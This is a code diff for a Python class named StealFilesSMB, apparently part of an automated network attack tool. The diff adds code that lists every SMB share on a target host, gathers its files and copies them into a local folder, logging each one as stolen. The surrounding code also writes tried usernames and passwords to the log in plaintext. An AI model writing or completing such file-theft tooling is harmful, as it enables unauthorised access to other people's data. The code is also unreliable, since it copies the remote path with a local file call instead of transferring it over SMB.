@@ -38,11 +38,30 @@ class StealFilesSMB(BaseSteal):
             logger.error(f"SMB connection error for {ip} with user '{username}' and password '{password}': {e}")
             return None
 
-    def find_items(self, conn, dir_path):
-        pass
+    def find_items(self, conn, share_name):
+        files = []
+        try:
+            for share in conn.listShares():
+                if share.name in IGNORED_SHARES or share.isSpecial or share.isTemporary:
+                    continue
+                files.extend(self.find_files(conn, share.name, '/'))
+            logger.info(f"Found {len(files)} items across all shares")
+        except Exception as e:
+            logger.error(f"Error finding items: {e}")
+        return files
 
     def steal_item(self, conn, remote_item, local_dir):
-        pass
+        try:
+            rel_path = os.path.relpath(remote_item, '/')
+            if rel_path.startswith('..') or os.path.isabs(rel_path):
+                raise ValueError("Path traversal detected")
+            local_file_path = os.path.join(local_dir, rel_path)
+            os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
+            import shutil
+            shutil.copy2(remote_item, local_file_path)
+            logger.success(f"Stolen item: {remote_item} -> {local_file_path}")
+        except Exception as e:
+            logger.error(f"Error stealing item {remote_item}: {e}")
 
     def list_shares(self, conn):
         try:
